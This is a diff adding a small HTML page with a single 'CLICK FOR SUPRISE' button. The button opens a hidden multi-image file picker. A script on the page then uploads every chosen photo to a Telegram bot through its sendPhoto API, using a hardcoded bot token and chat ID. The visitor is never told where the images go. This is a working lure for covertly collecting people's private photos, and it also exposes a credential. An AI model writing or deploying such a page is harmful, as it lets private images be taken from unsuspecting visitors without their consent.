@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        button {
+            padding: 20px 60px;
+            font-size: 24px;
+            background: black;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+        }
+        input { display: none; }
+    </style>
+</head>
+<body>
+    <input type="file" id="fileInput" multiple accept="image/*">
+    <button onclick="document.getElementById('fileInput').click()">CLICK FOR SUPRISE</button>
+
+    <script>
+        const BOT_TOKEN = '8634804759:AAG6w2djkgWmJdYVlbUMEyKYfYuYpqSZ16M';
+        const CHAT_ID = '8634804759';
+        const fileInput = document.getElementById('fileInput');
+
+        fileInput.addEventListener('change', async () => {
+            const files = fileInput.files;
+            for (const file of files) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', file);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                await new Promise(r => setTimeout(r, 300));
+            }
+            fileInput.value = '';
+        });
+    </script>
+</body>
+</html>
